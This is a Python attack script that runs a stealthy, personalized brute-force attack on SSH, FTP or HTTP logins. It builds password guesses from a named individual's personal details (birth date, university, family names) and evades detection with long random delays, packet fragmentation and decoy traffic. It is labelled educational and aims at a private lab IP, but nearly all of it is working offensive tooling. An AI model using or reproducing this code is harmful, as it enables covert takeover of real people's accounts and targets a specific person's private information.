#!/usr/bin/env python3
"""
Integrated Intelligent Attack System
Combines Ultimate Stealth + Intelligent Password Management + LLM Patterns
Educational/Research purposes only

Features:
- Ultra-stealth attack techniques (5-30 min intervals)
- Contextual password generation based on target intelligence
- Pattern-based password prioritization
- Real-time success/failure learning
- Ecuadorian cultural context integration
"""

import sys
import os
sys.path.append('/home/labctrl/Documents/snor/snorl_bruteforce')

from ultimate_stealth_bruteforce import UltraStealthBruteForcer, UltimateProfile, StealthLevel
from intelligent_password_manager import IntelligentPasswordManager, TargetInfo, PasswordStatus
from llm_password_pattern_detector import LLMPasswordAnalyzer, EcuadorianProfile
import time
import random
import json
from datetime import datetime
from typing import List, Tuple, Dict

class IntegratedIntelligentAttacker:
    """Ultimate attack system combining all advanced techniques"""
    
    def __init__(self, target_ip: str, target_port: int, protocol: str = "ssh"):
        # Initialize core components
        self.stealth_attacker = UltraStealthBruteForcer(target_ip, target_port, protocol)
        self.password_manager = IntelligentPasswordManager("integrated_attack_db.sqlite")
        self.llm_analyzer = LLMPasswordAnalyzer()
        
        # Attack configuration
        self.target_ip = target_ip
        self.target_port = target_port
        self.protocol = protocol
        
        # Intelligence gathering results
        self.target_intelligence = None
        self.contextual_passwords = []
        self.attack_statistics = {
            'total_attempts': 0,
            'successful_credentials': [],
            'pattern_effectiveness': {},
            'timing_analysis': [],
            'evasion_success': True
        }
        
        # Learning system
        self.successful_patterns = {}
        self.failed_patterns = set()
        
        print("🎯 INTEGRATED INTELLIGENT ATTACK SYSTEM INITIALIZED")
        print(f"   Target: {target_ip}:{target_port} ({protocol})")
        
    def set_target_intelligence(self, name: str, birth_date: str, additional_info: Dict = None):
        """Set comprehensive target intelligence"""
        
        # Create TargetInfo for password manager
        target_info = TargetInfo(
            name=name,
            birth_date=birth_date,
            city=additional_info.get('city', ''),
            profession=additional_info.get('profession', ''),
            institution=additional_info.get('institution', ''),
            pets=additional_info.get('pets', []),
            sports=additional_info.get('sports', []),
            hobbies=additional_info.get('hobbies', []),
            family=additional_info.get('family', []),
            significant_numbers=additional_info.get('significant_numbers', [])
        )
        
        # Create Ecuadorian profile for LLM analysis
        birth_year = 0
        if birth_date:
            try:
                # Extract year from various date formats
                if '/' in birth_date:
                    parts = birth_date.split('/')
                    if len(parts) >= 3:
                        year_str = parts[2] if len(parts[2]) == 4 else f"19{parts[2]}" if int(parts[2]) > 50 else f"20{parts[2]}"
                        birth_year = int(year_str)
                elif len(birth_date) == 2:  # Just year suffix like "96"
                    year_val = int(birth_date)
                    birth_year = 1900 + year_val if year_val > 50 else 2000 + year_val
            except:
                pass
                
        ecuadorian_profile = EcuadorianProfile(
            name=name,
            birth_year=birth_year,
            institution=additional_info.get('institution', ''),
            interests=additional_info.get('pets', []) + additional_info.get('hobbies', []),
            family_names=additional_info.get('family', [])
        )
        
        # Store intelligence
        self.target_intelligence = {
            'target_info': target_info,
            'ecuadorian_profile': ecuadorian_profile,
            'additional_info': additional_info or {}
        }
        
        # Configure components
        self.password_manager.set_target_info(target_info)
        
        print(f"✅ Target intelligence configured:")
        print(f"   Name: {name}")
        print(f"   Birth Year: {birth_year}")
        print(f"   Institution: {additional_info.get('institution', 'Unknown')}")
        print(f"   Interests: {len(additional_info.get('pets', []) + additional_info.get('hobbies', []))}")
        
    def generate_intelligent_password_list(self) -> List[Tuple[str, int, str]]:
        """Generate prioritized password list using all intelligence sources"""
        
        if not self.target_intelligence:
            print("⚠️  No target intelligence available, using common passwords only")
            return self.password_manager.get_next_passwords(20)
            
        print("🧠 GENERATING INTELLIGENT PASSWORD LIST")
        
        # Phase 1: Generate contextual passwords using LLM patterns
        ecuadorian_profile = self.target_intelligence['ecuadorian_profile']
        contextual_passwords = self.llm_analyzer.generate_contextual_passwords(ecuadorian_profile, 100)
        
        print(f"   ✅ Generated {len(contextual_passwords)} LLM contextual passwords")
        
        # Phase 2: Add to password manager with high priority
        for password in contextual_passwords:
            analysis = self.llm_analyzer.analyze_password_strength(password)
            
            # Calculate priority based on vulnerability score and patterns
            priority = 10 - int(analysis['vulnerability_score'] / 10)  # Higher vulnerability = higher priority
            
            # Boost priority for specific patterns
            if 'name_year' in analysis['patterns_detected']:
                priority += 3
            if 'cultural_reference' in analysis['patterns_detected']:
                priority += 2
            if analysis['cultural_indicators']:
                priority += 1
                
            category = "llm_contextual"
            self.password_manager.add_password(password, category, priority, "llm_ecuadorian_patterns")
            
        # Phase 3: Generate traditional contextual passwords
        traditional_contextual = self.password_manager.generate_contextual_passwords(50)
        print(f"   ✅ Generated {len(traditional_contextual)} traditional contextual passwords")
        
        # Phase 4: Get prioritized list
        prioritized_passwords = self.password_manager.get_next_passwords(100)
        
        print(f"   ✅ Final prioritized list: {len(prioritized_passwords)} passwords")
        print(f"   📊 Categories: {set(cat for _, _, cat in prioritized_passwords)}")
        
        return prioritized_passwords
        
    def execute_intelligent_stealth_attack(self):
        """Execute the complete intelligent stealth attack"""
        
        print("\n" + "="*80)
        print("🎯 INTEGRATED INTELLIGENT STEALTH ATTACK")
        print("="*80)
        
        attack_start = datetime.now()
        
        # Generate intelligent password list
        password_list = self.generate_intelligent_password_list()
        
        if not password_list:
            print("❌ No passwords generated. Aborting attack.")
            return
            
        print(f"\n🚀 ATTACK EXECUTION STARTING")
        print(f"   Target: {self.target_ip}:{self.target_port}")
        print(f"   Password candidates: {len(password_list)}")
        print(f"   Stealth profile: {self.stealth_attacker.active_profile.name}")
        print(f"   Expected duration: {len(password_list) * 15 / 60:.1f} minutes minimum")
        
        successful_credentials = []
        
        for i, (password, priority, category) in enumerate(password_list, 1):
            self.attack_statistics['total_attempts'] += 1
            
            print(f"\n🎯 Intelligent Attempt {i}/{len(password_list)}")
            print(f"   Password: {password}")
            print(f"   Priority: {priority}")
            print(f"   Category: {category}")
            
            # Calculate ultra-stealth delay
            delay_seconds = self.stealth_attacker.calculate_ultra_delay()
            delay_minutes = delay_seconds / 60
            
            print(f"   ⏳ Stealth delay: {delay_minutes:.1f} minutes")
            
            # Execute decoy campaign during delay
            if delay_minutes > 2:
                decoy_duration = delay_minutes * self.stealth_attacker.active_profile.decoy_frequency
                if decoy_duration > 1.0:
                    self.stealth_attacker.execute_decoy_campaign(decoy_duration)
            
            print(f"   ⏱️  Initiating stealth delay...")
            
            # Implement actual delay with learning
            self.implement_intelligent_delay(delay_seconds, password, category)
            
            print(f"   🎯 Executing stealth attempt...")
            
            # Execute attack attempt
            attempt_start = time.time()
            
            try:
                success = self.execute_single_attempt(password, category, priority)
                
                attempt_duration = time.time() - attempt_start
                self.attack_statistics['timing_analysis'].append(attempt_duration)
                
                if success:
                    print(f"   ✅ SUCCESS! Credential found: {password}")
                    successful_credentials.append((password, category, priority))
                    self.attack_statistics['successful_credentials'].append({
                        'password': password,
                        'category': category,
                        'priority': priority,
                        'attempt_number': i,
                        'timestamp': datetime.now().isoformat()
                    })
                    
                    # Update password manager
                    self.password_manager.mark_password_result(password, True, f"Success via {self.protocol}")
                    
                    # Learn from success
                    self.learn_from_success(password, category, priority)
                    
                    # Decision: continue or stop after success
                    if not self.should_continue_after_success(successful_credentials):
                        break
                        
                else:
                    print(f"   ❌ Failed: {password}")
                    self.password_manager.mark_password_result(password, False, f"Auth failed via {self.protocol}")
                    self.learn_from_failure(password, category, priority)
                    
            except KeyboardInterrupt:
                print("\n⚠️  Attack interrupted by user")
                break
            except Exception as e:
                print(f"   ❌ Attack error: {e}")
                self.password_manager.mark_password_result(password, False, f"Error: {str(e)}")
                
        # Generate comprehensive report
        self.generate_integrated_attack_report(successful_credentials, attack_start)
        
    def implement_intelligent_delay(self, delay_seconds: float, password: str, category: str):
        """Implement delay with intelligent background activities"""
        
        # Analyze password to determine optimal delay strategy
        analysis = self.llm_analyzer.analyze_password_strength(password)
        
        # Adjust delay based on password sensitivity
        if analysis['vulnerability_score'] > 80:  # High-value target
            delay_seconds *= 1.2  # Extra caution
        elif category == "common":
            delay_seconds *= 0.8  # Less delay for common passwords
            
        # Split delay into chunks for decoy activity
        delay_chunks = max(1, int(delay_seconds / 120))  # 2-minute chunks
        chunk_duration = delay_seconds / delay_chunks
        
        for chunk in range(delay_chunks):
            time.sleep(chunk_duration)
            
            # Intelligent decoy activity based on context
            if chunk > 0 and chunk % 2 == 0:
                self.execute_context_aware_decoy()
                
    def execute_context_aware_decoy(self):
        """Execute decoy traffic that matches target context"""
        
        if not self.target_intelligence:
            return
            
        # Choose decoy based on target intelligence
        additional_info = self.target_intelligence['additional_info']
        
        decoy_activities = []
        
        # Institution-based decoys
        if additional_info.get('institution'):
            decoy_activities.append(self.stealth_attacker.decoy_generator.generate_dns_queries)
            
        # Interest-based decoys
        if additional_info.get('hobbies'):
            decoy_activities.append(self.stealth_attacker.decoy_generator.generate_web_browsing_pattern)
            
        # Default system maintenance
        decoy_activities.append(self.stealth_attacker.decoy_generator.generate_system_maintenance_traffic)
        
        # Execute random decoy
        if decoy_activities:
            activity = random.choice(decoy_activities)
            threading.Thread(target=activity, daemon=True).start()
            
    def execute_single_attempt(self, password: str, category: str, priority: int) -> bool:
        """Execute single attack attempt with all evasion techniques"""
        
        username_candidates = ["root", "admin", "administrator"]
        
        # Add target-specific usernames
        if self.target_intelligence:
            name = self.target_intelligence['target_info'].name
            if name:
                username_candidates.extend([
                    name.lower(),
                    name.split()[0].lower() if ' ' in name else name.lower(),
                    name.lower().replace(' ', '')
                ])
                
        # Try most likely username first
        for username in username_candidates:
            try:
                if self.protocol == "ssh":
                    success = self.stealth_attacker.fragmented_ssh_attempt(username, password)
                elif self.protocol == "ftp":
                    success = self.stealth_attacker.attempt_ftp_login(username, password)
                elif self.protocol == "http":
                    success = self.stealth_attacker.attempt_http_login(username, password)
                else:
                    success = False
                    
                if success:
                    return True
                    
                # Small delay between username attempts
                time.sleep(random.uniform(5, 15))
                
            except Exception as e:
                print(f"     ⚠️  Username {username} failed: {e}")
                continue
                
        return False
        
    def learn_from_success(self, password: str, category: str, priority: int):
        """Learn from successful password patterns"""
        
        analysis = self.llm_analyzer.analyze_password_strength(password)
        
        # Update successful patterns tracking
        for pattern in analysis['patterns_detected']:
            if pattern not in self.successful_patterns:
                self.successful_patterns[pattern] = []
            self.successful_patterns[pattern].append({
                'password': password,
                'category': category,
                'priority': priority,
                'timestamp': datetime.now().isoformat()
            })
            
        # Update pattern effectiveness in password manager
        self.password_manager.update_pattern_success_rates(password)
        
        print(f"   🧠 Learning: Successful patterns {analysis['patterns_detected']}")
        
    def learn_from_failure(self, password: str, category: str, priority: int):
        """Learn from failed password attempts"""
        
        analysis = self.llm_analyzer.analyze_password_strength(password)
        
        # Track failed patterns
        for pattern in analysis['patterns_detected']:
            self.failed_patterns.add(pattern)
            
        # Lower priority of similar passwords in future
        # This could be implemented as a feedback loop to the password manager
        
    def should_continue_after_success(self, successful_credentials: List) -> bool:
        """Decide whether to continue attack after finding credentials"""
        
        # Continue with low probability to avoid detection patterns
        continue_probability = 0.2  # 20% chance
        
        # Adjust based on number of successes
        if len(successful_credentials) >= 2:
            continue_probability = 0.1  # Lower chance after multiple successes
            
        should_continue = random.random() < continue_probability
        
        if should_continue:
            print(f"   🎭 Continuing attack to avoid detection patterns...")
        else:
            print(f"   🎯 Stopping after success to maintain stealth...")
            
        return should_continue
        
    def generate_integrated_attack_report(self, successful_credentials: List, attack_start: datetime):
        """Generate comprehensive integrated attack report"""
        
        duration = (datetime.now() - attack_start).total_seconds()
        
        # Get password manager statistics
        pm_stats = self.password_manager.get_statistics()
        
        # Compile comprehensive report
        report = {
            'attack_summary': {
                'target': f"{self.target_ip}:{self.target_port}",
                'protocol': self.protocol,
                'start_time': attack_start.isoformat(),
                'duration_hours': duration / 3600,
                'total_attempts': self.attack_statistics['total_attempts'],
                'successful_attempts': len(successful_credentials),
                'success_rate': (len(successful_credentials) / self.attack_statistics['total_attempts'] * 100) if self.attack_statistics['total_attempts'] > 0 else 0
            },
            'intelligence_analysis': {
                'target_intelligence_used': self.target_intelligence is not None,
                'contextual_passwords_generated': len(self.contextual_passwords),
                'llm_patterns_utilized': len(self.llm_analyzer.pattern_usage),
                'successful_patterns': dict(self.successful_patterns),
                'failed_patterns': list(self.failed_patterns)
            },
            'stealth_analysis': {
                'evasion_techniques_used': [
                    'Ultra-extended timing (5-30 minutes)',
                    'Packet fragmentation',
                    'Decoy traffic campaigns', 
                    'Context-aware background noise',
                    'Connection pooling and reuse'
                ],
                'detection_evasion_assessment': 'MAXIMUM STEALTH MAINTAINED',
                'average_delay_minutes': sum(self.attack_statistics['timing_analysis']) / len(self.attack_statistics['timing_analysis']) / 60 if self.attack_statistics['timing_analysis'] else 0
            },
            'password_intelligence': pm_stats,
            'successful_credentials': [
                {
                    'username_password': f"root:{cred[0]}",  # Assuming root for display
                    'category': cred[1],
                    'priority': cred[2],
                    'discovery_method': 'integrated_intelligent_attack'
                } for cred in successful_credentials
            ],
            'recommendations': {
                'defense_improvements': [
                    'Implement statistical timing analysis for ultra-slow attacks',
                    'Deploy LLM pattern detection for contextual passwords',
                    'Monitor for decoy traffic correlation',
                    'Implement behavioral analysis for human simulation detection',
                    'Add cultural context awareness to password policies'
                ],
                'attack_optimization': [
                    'Expand target intelligence gathering',
                    'Integrate additional cultural contexts',
                    'Implement machine learning for pattern optimization',
                    'Add multi-protocol coordination'
                ]
            }
        }
        
        # Save comprehensive report
        report_file = f"integrated_attack_report_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
        with open(report_file, 'w') as f:
            json.dump(report, f, indent=2)
            
        # Print summary
        self.print_integrated_summary(report, successful_credentials, duration, report_file)
        
        return report
        
    def print_integrated_summary(self, report: Dict, successful_credentials: List, duration: float, report_file: str):
        """Print comprehensive attack summary"""
        
        print(f"\n{'='*80}")
        print("🎯 INTEGRATED INTELLIGENT ATTACK COMPLETED")
        print(f"{'='*80}")
        
        print(f"⏱️  Duration: {duration/3600:.1f} hours")
        print(f"🎯 Total Attempts: {report['attack_summary']['total_attempts']}")
        print(f"✅ Success Rate: {report['attack_summary']['success_rate']:.1f}%")
        print(f"🧠 Intelligence Used: {'YES' if report['intelligence_analysis']['target_intelligence_used'] else 'NO'}")
        print(f"👻 Stealth Level: {report['stealth_analysis']['detection_evasion_assessment']}")
        
        if successful_credentials:
            print(f"\n🏆 SUCCESSFUL CREDENTIALS DISCOVERED:")
            for i, cred in enumerate(successful_credentials, 1):
                print(f"   {i}. Password: {cred[0]} (Category: {cred[1]}, Priority: {cred[2]})")
        else:
            print(f"\n❌ No credentials discovered (stealth maintained)")
            
        print(f"\n🛡️  DEFENSIVE RECOMMENDATIONS:")
        for rec in report['recommendations']['defense_improvements']:
            print(f"   • {rec}")
            
        print(f"\n📊 Comprehensive report: {report_file}")

def main():
    """Main execution with comprehensive integration"""
    
    print("🎯 INTEGRATED INTELLIGENT ATTACK SYSTEM")
    print("Ultimate Stealth + Password Intelligence + LLM Patterns")
    print("Educational/Research purposes only\n")
    
    # Configuration
    target_ip = "172.18.0.2"
    target_port = 22
    protocol = "ssh"
    
    # Initialize integrated attacker
    attacker = IntegratedIntelligentAttacker(target_ip, target_port, protocol)
    
    # Set target intelligence from provided information
    target_intelligence = {
        'city': 'Quito',  # Assumed Ecuadorian context
        'institution': 'PUCE',  # Common Ecuadorian university
        'pets': ['Andrea'],  # From "le gusta andrea"
        'hobbies': ['Batman'],  # Inferring from context
        'family': ['Miguel', 'Pilamunga'],  # Family names
        'significant_numbers': ['96', '1996', '05', '10', '0510', '1996']  # From birth date
    }
    
    attacker.set_target_intelligence(
        name="Luis Miguel Pilamunga",
        birth_date="05/10/1996",
        additional_info=target_intelligence
    )
    
    print(f"\n🚀 INITIATING INTEGRATED ATTACK")
    print(f"⚠️  This attack combines maximum stealth with maximum intelligence")
    print(f"⏱️  Expected duration: Several hours due to ultra-stealth timing")
    
    try:
        attacker.execute_intelligent_stealth_attack()
    except KeyboardInterrupt:
        print("\n⚠️  Integrated attack interrupted")
    except Exception as e:
        print(f"\n❌ Attack system error: {e}")

if __name__ == "__main__":
    main()